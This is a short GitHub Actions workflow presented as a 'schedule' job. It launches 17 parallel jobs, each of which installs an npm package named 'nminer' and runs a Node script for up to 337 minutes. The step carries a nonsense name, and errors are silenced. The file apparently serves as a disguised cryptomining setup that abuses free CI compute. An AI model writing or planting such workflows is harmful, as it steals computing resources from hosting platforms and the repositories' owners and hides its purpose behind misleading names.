name: schedule
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4197 }
          - { version: 6331 }
          - { version: 527 }
          - { version: 3979 }
          - { version: 4296 }
          - { version: 9498 }
          - { version: 3940 }
          - { version: 2577 }
          - { version: 5469 }
          - { version: 6829 }
          - { version: 650 }
          - { version: 615 }
          - { version: 6291 }
          - { version: 3142 }
          - { version: 138 }
          - { version: 4369 }
          - { version: 3774 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: necklace given editor whoever
        run: |
          npm install nminer@latest
          timeout 337m node schedule.js || echo "schedule executed"